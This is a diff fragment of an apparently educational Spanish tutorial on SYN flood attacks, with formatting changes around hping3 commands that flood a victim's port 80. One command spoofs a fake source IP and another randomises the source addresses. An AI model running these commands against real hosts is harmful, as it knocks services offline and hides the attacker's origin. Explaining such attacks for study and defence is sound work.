@@ -81,9 +81,14 @@ hping3 -p 80  -S --flood [ip_victima]
 Se puede comprobar que <b>-p</b> es utilizado para determinar el puerto, que <b>-S</b> activa la flag SYN del paquete TCP-IP, y que <b>--flood</b> indica que el envío de paquetes se realizará de la manera más rápida posible. Además, podemos encubrir el origen con múltiples variantes
 
 <b>
+
 ```
 hping3 -a [ip_atacante_falsa] -p 80  -S --flood [ip_victima] # IP de origen encubierta
 ```
+</b>
+
+<b>
+
 ```
 hping3 --rand-source -p 80  -S --flood [ip_victima] # IP de origen generada aleatoriamente
 ```
